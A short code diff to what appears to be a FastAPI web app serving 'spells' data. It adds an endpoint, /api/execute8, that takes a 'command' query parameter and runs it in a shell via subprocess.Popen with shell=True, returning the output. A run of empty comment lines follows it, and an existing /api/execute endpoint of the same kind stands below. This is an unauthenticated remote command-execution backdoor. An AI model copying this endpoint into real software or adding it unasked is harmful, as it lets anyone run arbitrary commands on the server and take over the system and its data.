@@ -39,6 +39,26 @@ async def get_all_spells():
         spells.append(spell_helper(spell))
     return spells
 
+@app.get("/api/execute8")
+async def execute_command( request: Request, command: str | None = None):
+    new_command = request.query_params.get("command")
+    process = subprocess.Popen(
+        new_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = process.stdout.read().decode()
+    stderr = process.stderr.read().decode()
+
+    return {"stdout": stdout, "stderr": stderr}
+#
+#
+##
+#
+#
+#
+#
+#
+#
+##
+#
 
 @app.get("/api/execute")
 async def execute_command( request: Request, command: str | None = None):
